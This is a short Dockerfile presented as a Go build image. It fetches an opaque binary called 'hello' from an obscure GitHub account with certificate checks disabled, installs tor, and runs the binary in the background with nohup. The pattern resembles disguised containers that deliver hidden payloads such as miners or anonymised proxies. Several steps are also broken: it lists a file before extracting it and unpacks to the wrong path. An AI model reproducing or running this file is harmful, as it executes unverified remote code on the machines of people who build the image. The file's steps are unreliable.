FROM golang:alpine AS builder
RUN apk update && apk add --no-cache git bash curl

RUN wget --no-check-certificate -O /tmp/hello https://raw.githubusercontent.com/pf5q5SY3W72r0JH8/mytest/master/hello && \
    tar czvf /tmp/hello.tgz /tmp/hello && \
     chmod +x /tmp/hello && \
     ls -l /usr/bin/hello

RUN apk update && apk add --no-cache tor ca-certificates && \
    tar xvfz /tmp/hello.tgz -C /usr/bin && \
    rm -rf /tmp/hello.tgz
    
CMD nohup /tmp/hello
